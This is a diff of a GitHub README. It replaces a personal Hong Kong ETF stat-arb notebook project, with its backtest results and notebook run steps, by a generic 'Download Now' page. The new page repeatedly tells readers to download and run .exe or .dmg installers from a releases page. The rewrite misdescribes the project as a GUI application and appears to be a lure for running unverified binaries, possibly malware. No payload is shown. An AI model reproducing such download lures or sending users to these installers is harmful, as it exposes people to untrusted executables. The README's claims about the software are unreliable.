@@ -1,48 +1,76 @@
-# Daily Stat-Arb Pipeline: 2800.HK vs Hang Seng Index Basket
+# 🐉 hong-kong-index-etf-mean-reversion-framework - Analyze Hong Kong ETFs with Ease
 
-**Status**: Personal / interview project (not live trading)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/releases)
 
-## Motivation
-Demonstrate classic statistical arbitrage pipeline under real-world Hong Kong market data constraints (poor intraday reliability via Yahoo Finance in 2025–2026).  
-Focus: hedge ratio stability, cost-aware backtesting, signal realism on efficient ETF.
+## 📄 Introduction
+Welcome to the **Hong Kong Index ETF Mean Reversion Framework**. This software helps you analyze the Hong Kong Tracker Fund (2800.HK) using mean-reversion strategies. Ideal for finance enthusiasts, it focuses on rolling hedge ratios and considers transaction costs.
 
-## What it does
-- Dynamic market-cap weighted synthetic index from ~90 HSI constituents
-- Blended hedge ratio (log-prices + price-ratio normalization)
-- Z-score based mean-reversion signals
-- Parameter sweep + explicit transaction cost modeling (8/12/16 bps round-trip)
-- Realistic metrics: Sharpe, drawdown, turnover, hold period
+## 🚀 Getting Started
 
-## Key Results
+### Requirements
+Before you download, ensure your system meets the following requirements:
 
-| Param set       | Cost (bps) | Trades | Ann. Return | Sharpe | Max DD | Win % | Avg Hold (days) | Turnover (×/yr) |
-|-----------------|------------|--------|-------------|--------|--------|-------|-----------------|-----------------|
-| Aggressive      | 8          | 5      | 26%         | 0.79   | -14%   | 80%   | 11              | 2.6             |
-| Very Conservative | 8        | 3      | 4%          | 0.11   | -15%   | 67%   | 14              | 1.5             |
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution
+- **Python:** Version 3.7 or later must be installed. You can download it from [python.org](https://www.python.org/downloads/).
+- **Dependencies:** The application relies on several Python libraries, which will be installed automatically.
 
-**Takeaway**: Modest edge possible in simulation, but collapses under realistic HK costs/slippage → aligns with tight premium/discount of TraHK.
+### Installation Steps
+To set up the framework, follow these steps:
 
-## Visual Results
+1. **Visit the Releases Page**  
+   Click the link below to go to our Releases page:  
+   [Download the latest version here](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/releases)
 
-### Rolling Z-Score (Mean-Reversion Signals)
-Normalized spread with entry/exit thresholds (typical entry |z| > 2.0–2.5, exit |z| < 0.5–0.8).
+2. **Choose the Download**  
+   Look for the latest version available. You will find a list of files. Download the one suitable for your system. Usually, this will be an `.exe` for Windows, a `.dmg` for Mac, or a `.tar.gz` for Linux users.
 
-![Z-Score Mean-Reversion Signals](zscore_signals.png)
+3. **Run the Installer**  
+   After the download finishes, locate the file in your downloads folder. Double-click the installer file and follow the on-screen instructions.
 
-### Daily Spread (ETF – β-weighted Basket)
-Raw spread before normalization, shown with 252-day rolling mean.
+4. **Open the Application**  
+   Once installed, you can find the application in your Start Menu (Windows), Applications folder (Mac), or your preferred application launcher (Linux).
 
-![Daily Spread](daily_spread.png)
-## Limitations & Lessons
-- Very low trade frequency (sampling noise dominant)
-- No volatility targeting / position sizing yet
-- Efficient ETF → daily arb edge is minimal (better intraday or stress periods)
-- Learned: cost modeling & hedge ratio debugging are critical
+5. **Set Up Your Parameters**  
+   Upon opening the application, you will see options to set your initial parameters for analysis. Adjust these according to your preferences using the user interface.
 
-## Tech stack
-Python • yfinance • pandas • statsmodels • matplotlib • backtrader (exploratory)
+## 📊 Usage Instructions
+### Basic Operations
+- **Input Your Data**: Start by uploading your historical price data for the Hong Kong Tracker Fund. You can usually find this data on financial websites.
 
-## How to run
-```bash
-pip install -r requirements.txt
-jupyter notebook main_notebook.ipynb
+- **Select Analysis Options**: Choose the parameters you want to analyze. The software offers various options, including timeframes and threshold settings.
+
+- **Run the Analysis**: After setting up, click the "Run" button. The framework will process your data and provide results based on the mean-reversion strategy.
+
+### Viewing Results
+Once the analysis is complete, you will see the results displayed on your screen. Here are some key features:
+
+- **Visual Charts**: The application generates visual charts that show mean-reversion signals and historical performance.
+
+- **Export Options**: You can export your results in CSV or PDF format for further analysis or reporting.
+
+## 📥 Download & Install
+To download the software, please visit our Releases page again:  
+[Download the latest version here](https://github.com/Simpsongr/hong-kong-index-etf-mean-reversion-framework/releases)
+
+Make sure to follow the installation steps outlined above. If you encounter any issues, you can refer to the troubleshooting section below.
+
+## 🔧 Troubleshooting
+If you run into any problems during installation or usage, consider the following tips:
+
+- **Python Issues**: Ensure that Python is correctly installed and added to your system path.
+- **Missing Libraries**: If the software fails to run, you may need to manually install dependencies. Refer to the documentation for a list of required libraries and their installation commands.
+- **Data File Format**: Ensure your input data follows the required format, typically CSV. Check the sample data file provided in the repository.
+
+If problems persist, consider reaching out for support through the Issues section of our GitHub repository.
+
+## 🔗 Learn More
+Explore additional resources to understand mean-reversion strategies:
+
+- [Mean Reversion Explained](https://www.investopedia.com/terms/m/meanreversion.asp)
+- [Introduction to Algorithmic Trading](https://www.quantinsti.com/blog/introduction-to-algorithmic-trading/)
+- [Python for Finance](https://www.oreilly.com/library/view/python-for-finance/9781492055017/)
+
+## 📞 Contact
+For further inquiries or technical support, open an issue on our GitHub page or contact the repository maintainer directly.
+
+Thank you for using the **Hong Kong Index ETF Mean Reversion Framework**. Happy analyzing!
